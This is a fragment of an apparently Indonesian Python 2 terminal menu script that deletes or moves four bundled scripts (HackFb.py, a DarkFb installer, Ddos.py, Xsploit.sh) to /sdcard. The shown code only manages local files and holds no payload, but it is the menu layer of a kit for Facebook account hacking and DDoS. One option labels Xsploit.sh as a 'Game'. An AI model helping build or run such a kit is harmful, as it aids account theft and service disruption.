    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "0":
        tik()
        banner3()
    elif pilih == "1":
        os.system("rm -rf HackFb.py")
        print W+"Proses Remove Tool"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner6()
    elif pilih == "2":
        os.system("rm -rf installer.py")
        print W+"Proses Remove Tool"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner6()
    elif pilih == "3":
        os.system("rm -rf Ddos.py")
        print W+"Proses Remove Tool"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner6()
    elif pilih == "4":
        os.system("rm -rf Xsploit.sh")
        print W+"Proses Remove Tool"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner6()
    else :
        tik()
        print "Pilihan Tidak Ada"
        time.sleep(2)
        banner6()

def banner7():
    os.system("clear")
    print W+" "
    print W+"      ╔═══════════╗"
    print W+"    ╔═╝███████████╚═╗           "+B+"╔══╗╔═╗╔══╗╔══╗╔═╗  "+R+"╔══╗╔══╗"
    print W+"   ╔╝███████████████╚╗          "+B+"╚╗╔╝║╦╝║╔═╣║╔╗║║╬║  "+R+"╚║║╝╚╗╗║"
    print W+"   ║█████████████████║          "+B+"─║║─║╩╗║╚╗║║╠╣║║╗╣  "+R+"╔║║╗╔╩╝║"
    print W+"   ║█████████████████║          "+B+"─╚╝─╚═╝╚══╝╚╝╚╝╚╩╝  "+R+"╚══╝╚══╝"
    print W+"   ║█████████████████║"
    print W+"   ║█╔█████████████╗█║         "+R+"[ "+Y+"Menu Pilihan "+R+"]"
    print W+"   ╚╦╝███▒▒███▒▒███╚╦╝"
    print W+"   ╔╝██▒▒▒▒███▒▒▒▒██╚╗     ["+G+"1"+W+"] Move Tools HackFb to "+Y+"/sdcard"
    print W+"   ║██▒▒▒▒▒███▒▒▒▒▒██║     ["+G+"2"+W+"] Move Tools Installer DarkFb to "+Y+"/sdcard"
    print W+"   ║██▒▒▒▒█████▒▒▒▒██║     ["+G+"3"+W+"] Move Tools Ddos to "+Y+"/sdcard"
    print W+"   ╚╗███████████████╔╝     ["+G+"4"+W+"] Move Tools Game to "+Y+"/sdcard"
    print W+"  ╔═╬══╦╝██▒█▒██╚╦══╝      ["+R+"0"+W+"] Exit To Menu"
    print W+"  ║█║══║█████████║"
    print W+"  ║█║══║█║██║██║█║      "+G+"v0.1"
    print W+"  ║█║══╚═╩══╩╦═╩═╩═╦╗"
    print W+" ╔╝█╚══╦═╦══╦╩═╦═╦═╩╝"
    print W+"╔╝█████║█║██║██║█║"
    print W+"║██████║█████████║"
    print " "
    pilih = raw_input(Y+"["+R+"root"+Y+"/"+B+"Tegar-ID"+Y+"]"+R+"> ")
    if pilih == "0":
        tik()
        banner3()
    elif pilih == "1":
        os.system("mv HackFb.py /sdcard")
        print W+"Proses Move Tool To "+Y+"/sdcard"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner7()
    elif pilih == "2":
        os.system("mv installer.py /sdcard")
        print W+"Proses Move Tool To "+Y+"/sdcard"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner7()
    elif pilih == "3":
        os.system("mv Ddos.py /sdcard")
        print W+"Proses Move Tool To "+Y+"/sdcard"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner7()
    elif pilih == "4":
        os.system("mv Xsploit.sh /sdcard")
        print W+"Proses Move Tool To "+Y+"/sdcard"
        tik()
        print W+"["+G+"✔"+W+"] "+G+"Done!!"
        time.sleep(2)
        banner7()
    else :
        tik()
        print "Pilihan Tidak Ada"
        time.sleep(2)
        banner7()
banner()

